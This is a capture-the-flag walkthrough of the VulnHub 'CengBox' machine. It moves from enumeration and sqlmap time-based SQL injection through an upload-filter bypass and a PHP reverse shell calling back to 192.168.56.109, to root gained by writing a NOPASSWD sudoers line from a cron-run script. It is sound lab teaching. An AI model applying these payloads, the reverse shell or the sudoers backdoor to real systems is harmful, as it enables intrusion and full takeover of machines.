After a long break off of CTF's, I decided to dive into this one. 

Here's the description from the vulnhub page:
{% highlight text %}
There is a company which seems unreliable. You must think like a hacker and 
hack it easily. I think you do not need a hint but here is the nudges for you. 
For user you should understand how it is work and manipulate it. 
You might need everything that you'll find. For root, wait a minute.

#### Enumeration 

Nmap service scan results: 
{% highlight terminal %}
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
{% endhighlight %}

Enumerating interesting dirctories on the webserver with dirb:
{% highlight terminal %}
user@attacker ~ $ dirb http://cengbox/ /usr/share/dirb/wordlists/big.txt
{% endhighlight %}
Dirb reveals an interesting directory called `masteradmin/`. Let's dig a little
deeper and filter for php files:
{% highlight terminal %}
user@attacker ~ $ dirb http://cengbox/masteradmin /usr/share/dirb/wordlists/big.txt -X .php

---- Scanning URL: http://cengbox/masteradmin/ ----
http://cengbox/masteradmin/db.php (CODE:200|SIZE:0)
http://cengbox/masteradmin/login.php (CODE:200|SIZE:5137)               
http://cengbox/masteradmin/upload.php (CODE:200|SIZE:1440)    
{% endhighlight %}

#### Gaining access to the masteradmin area
login.php shows a PHP form. After a while of failed bruteforcing attempts, I 
switched to sqlmap and test if either of the fields are vulnerable to SQL 
injection. First, we'll need to get all of the request data and throw it into a 
file, then feed it to sqlmap. This can be done with BurpSuite set up as a proxy, 
or by copying the information in the network tab in the developer tools section of 
your browser. I saved the HTTP request data to a `master-admin` text file:
{% highlight text %}
POST /masteradmin/login.php HTTP/1.1
Host: cengbox
Connection: keep-alive
Content-Length: 37
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://cengbox
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://cengbox/masteradmin/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=rqlj4ki81lc5mgcjffhv5g44r0

username=admin&password=admin&submit=
{% endhighlight %}

Now let's feed the request data to sqlmap using the '-r' option:
{% highlight terminal %}
user@attacker ~ $ sqlmap -r master-admin
SNIP!
sqlmap identified the following injection point(s) with a total of 97 HTTP(s) requests:
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 8185 FROM (SELECT(SLEEP(5)))dytG) AND 'UrhE'='UrhE&password=admin&submit=
{% endhighlight %}

So, the username field is vulnerable. Let's dump the tables using the `--dump` option with sqlmap:
{% highlight terminal %}
user@attacker ~ $ sqlmap --dump -r master-admin
-- SNIP! --
Database: cengbox
Table: admin
[1 entry]
+------+-------------+---------------+
| id   | username    | password      |
+------+-------------+---------------+
| 1    | masteradmin | C3ng0v3R00T1! |
+------+-------------+---------------+
{% endhighlight %}

__That looks like a plaintext password.__

Back to the webserver to test it. Logging in redirects to `upload.php` 
To test what can be uploaded, I uploaded a jpeg and got the following error:
>"extension not allowed, please choose a CENG file."

Uploading the same jpeg, but with the additional ".ceng" file extension shows:
>"Success" 

This file can be located in the `uploads/` directory, but it's displayed as raw
data and not as the uploaded image. 

#### Can we execute PHP scripts? 
Let's write a simple PHP script that 
{% highlight php %}
<?php echo "This could be a shell, but u trippin" ?>
{% endhighlight %}

save the file as `test.php.ceng`, upload and navigate to the file on the server

http://cengbox/uploads/test.php.ceng reveals that we can execute code on
the server. 


#### Getting a low privilege shell
Exploiting this configuration error by uploading a [PHP reverse TCP shell script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) that connects back to a netcat listener on the attacking machine. 

before uploading the script, two variables need to be changed: 
{% highlight php %}
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
{% endhighlight %}

To this:
{% highlight php %}
$ip = '192.168.56.109';  // the attacking IP or Hostname
$port = 666;       // very black metal, very cool.
{% endhighlight %}

Save and upload it with a .ceng extension. Before executing the script, we'll
set up the netcat listener:
{% highlight terminal %}
user@attacker ~ $ nc -nvlp 666
{% endhighlight %}

Then execute the script with the browser:
http://cengbox/uploads/reverse-shell.php.ceng

#### CONNECTED
{% highlight terminal %}
user@attacker ~ $ nc -nvlp 666
Linux cengbox 4.4.0-177-generic #207-Ubuntu SMP Mon Mar 16 01:16:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

#### Local Enumeration On Server 
We'll need to enumerate some things on the target machine. First off, let's get
the users:
{% highlight terminal %}
$ cat /etc/passwd
--SNIP--
cengover:x:1000:1000:cengover,,,:/home/cengover:/bin/bash
{% endhighlight %}
Mostly the usual users, plus the cengover user. This is likely an admin.
We have a plaintext masteradmin password, so maybe it will work for cengover:
{% highlight terminal %}
user@attacker ~ $ ssh cengover@cengbox

cengover@cengbox's password:

#### Getting the first flag
{% highlight terminal %}
cengover@cengbox:~$ ls
user.txt
cengover@cengbox:~$ cat user.txt

### Escalating Privileges
taking a swing at some low hanging fruit:
{% highlight terminal %}
cengover@cengbox:~$ sudo -i
[sudo] password for cengover: 
cengover is not in the sudoers file.  This incident will be reported.
{% endhighlight %}

Any SUID misconfigurations of note? 
{% highlight terminal %}
cengover@cengbox:~$ find / -uid 0 -perm -4000 -type f 2>/dev/null
/bin/ping6
/bin/su
/bin/mount
/bin/ping
/bin/umount
/bin/fusermount
/sbin/mount.ecryptfs_private
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
{% endhighlight %}

Maybe something jumps out at you, but I didn't spot anything of note. 

#### Exploring the installed software
To get a better feel for the system, I poke around in the `/usr/`, `/opt/` and
`/var/` directories for configs, possibly vulnerable software versions and logs.
Then __by chance__ in the `opt` directory:
{% highlight terminal %}
cengover@cengbox:~$ ls -al /opt/
total 12
drwxr-xr-x  2 root root  4096 Apr 28 13:35 .
drwxr-xr-x 23 root root  4096 Apr 26 13:28 ..
-rw-rw----  1 root users  545 Apr 29 16:12 md5check.py
{% endhighlight %}

The cengover user doesn't have execution permissions on the script, but the do
have read, write permissions on both the opt directory and the script.
#### md5check.py writable?
{% highlight python %}
import hashlib
import datetime
time = datetime.datetime.now()
fileValue = "a6f529aaed396d7b7e10a07d35a8ea2b"
md5Hash = hashlib.md5()
openFile = open("/etc/passwd","rb")
content = openFile.read()
md5Hash.update(content)
digest = md5Hash.hexdigest()
if fileValue != digest :
    f = open("/root/warning.txt","a")
    f.write("File had changed.")
    f.write(str(time))
    f.write("\n")
    f.close()
else:
    f = open("/root/note.txt","a")
    f.write("File still seems the same. Date : ")
    f.write(str(time))
    f.write("\n")
    f.close()
{% endhighlight %}

It's a logging script that checks the hardcoded hash value against the 
`/etc/passwd` hash and logs when the values differ or remain the same in the 
root user directory. This is periodically run by a cron job, but the cengover 
user can't check for it. The code doesn't seem very relevant so editing the code 
to append cengover to the sudoers file should probably do it:
{% highlight python %}
f = open("/etc/sudoers","a")
f.write("cengover ALL=(ALL) NOPASSWD:ALL\n")
f.close()
{% endhighlight %}

After a while, the script is called by cron and cengover is appended to the 
sudoers file __(if left unchecked, this will happen multiple times..)__ 

#### Root shell
{% highlight terminal %}
cengover@cengbox:~$ sudo -i
root@cengbox:~#
{% endhighlight %}
Here's the root flag.
{% highlight terminal %}
root@cengbox:~# cat root.txt
